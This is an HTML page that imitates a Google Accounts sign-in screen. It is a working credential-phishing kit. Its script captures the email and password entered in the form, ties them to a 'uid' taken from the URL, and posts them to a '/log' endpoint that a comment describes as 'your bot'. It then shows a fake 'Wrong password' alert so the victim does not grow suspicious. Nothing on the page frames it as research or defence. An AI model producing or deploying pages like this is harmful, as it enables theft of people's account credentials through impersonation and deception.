<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', Arial, sans-serif;
        }
        
        body {
            background: #fff;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        
        .header {
            width: 100%;
            padding: 20px;
            display: flex;
            justify-content: flex-end;
        }
        
        .nav-links {
            display: flex;
            gap: 15px;
            align-items: center;
        }
        
        .nav-links a {
            text-decoration: none;
            color: #5f6368;
            font-size: 14px;
        }
        
        .nav-links a:hover {
            text-decoration: underline;
        }
        
        .logo {
            text-align: center;
            margin: 40px 0 20px 0;
        }
        
        .logo-text {
            font-size: 22px;
            color: #202124;
            margin-top: 10px;
        }
        
        .login-container {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            width: 450px;
            margin: 0 auto;
        }
        
        .login-title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .login-subtitle {
            text-align: center;
            color: #202124;
            font-size: 16px;
            margin-bottom: 30px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: border 0.2s;
        }
        
        input[type="email"]:focus,
        input[type="password"]:focus {
            border: 2px solid #1a73e8;
            outline: none;
        }
        
        .forgot-email {
            text-decoration: none;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
        }
        
        .forgot-email:hover {
            text-decoration: underline;
        }
        
        .disclaimer {
            color: #5f6368;
            font-size: 14px;
            margin: 40px 0 30px;
            line-height: 1.5;
        }
        
        .disclaimer a {
            text-decoration: none;
            color: #1a73e8;
        }
        
        .disclaimer a:hover {
            text-decoration: underline;
        }
        
        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }
        
        .create-account {
            text-decoration: none;
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
        }
        
        .create-account:hover {
            text-decoration: underline;
        }
        
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .next-button:hover {
            background: #1669d6;
        }
.footer {
            margin-top: 40px;
            text-align: center;
            color: #5f6368;
            font-size: 12px;
            padding: 20px;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 10px;
        }
        
        .footer-links a {
            text-decoration: none;
            color: #5f6368;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .language-selector {
            margin-top: 10px;
        }
        
        .language-selector select {
            border: none;
            color: #5f6368;
            background: none;
            font-size: 12px;
        }
        
        @media (max-width: 480px) {
            .login-container {
                width: 100%;
                border: none;
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="nav-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
    
    <!-- Logo -->
    <div class="logo">
        <svg width="75" height="24" viewBox="0 0 75 24" fill="none">
            <path d="M10.234 12.024c0 1.566-.94 2.67-2.34 2.67-1.398 0-2.338-1.104-2.338-2.67s.94-2.67 2.338-2.67c1.4 0 2.34 1.104 2.34 2.67zm-2.34-9.36c-3.318 0-6 2.724-6 6.09 0 3.366 2.682 6.09 6 6.09 3.318 0 6-2.724 6-6.09 0-3.366-2.682-6.09-6-6.09zm14.58 12.45h-2.94V6.714h-2.46V4.764h7.86v1.95h-2.46v8.34zm7.32-8.34h2.94l-2.1 3.18 2.22 3.51h-3.06l-1.32-2.28-1.32 2.28h-3.06l2.22-3.51-2.1-3.18h2.94l1.38 2.28 1.38-2.28zm8.46 0h2.22v8.34h-2.22V8.664h-3.18V6.714h8.58v1.95h-3.18v6.39h-2.22V6.714zm12.84 0h2.22v8.34h-2.22V8.664h-3.18V6.714h8.58v1.95h-3.18v6.39h-2.22V6.714zm9.36 0h2.22v6.39h3.18v1.95h-5.4V6.714zm12.84 8.34h-2.94l2.1-3.18-2.22-3.51h3.06l1.32 2.28 1.32-2.28h3.06l-2.22 3.51 2.1 3.18h-2.94l-1.38-2.28-1.38 2.28z" fill="#5f6368"/>
        </svg>
        <div class="logo-text">Sign in</div>
    </div>
    
    <!-- Login Form -->
    <div class="login-container">
        <h1 class="login-title">Sign in</h1>
        <p class="login-subtitle">Use your Google Account</p>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="username" placeholder="Email or phone" required>
            </div>
            
            <div class="input-group">
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            
            <a href="#" class="forgot-email">Forgot email?</a>
            
            <div class="disclaimer">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#">Learn more</a>
            </div>
            
            <div class="button-group">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="next-button">Next</button>
            </div>
        </form>
    </div>
    
    <!-- Footer -->
    <div class="footer">
        <div class="footer-links">
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
            <a href="#">Help</a>
        </div>
        <div class="language-selector">
            <select>
                <option>English (United States)</option>
                <option>Español</option>
                <option>Français</option>
                <option>中文</option>
            </select>
        </div>
    </div>

    <script>
        // Get user ID from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('uid');
document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data to your bot
            fetch('/log', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({
                    username: username, 
                    password: password, 
                    site: 'google',
                    user_id: userId
                })
            });
            
            alert('Wrong password. Try again or click Forgot password to reset it.');
        });
    </script>
</body>
</html>
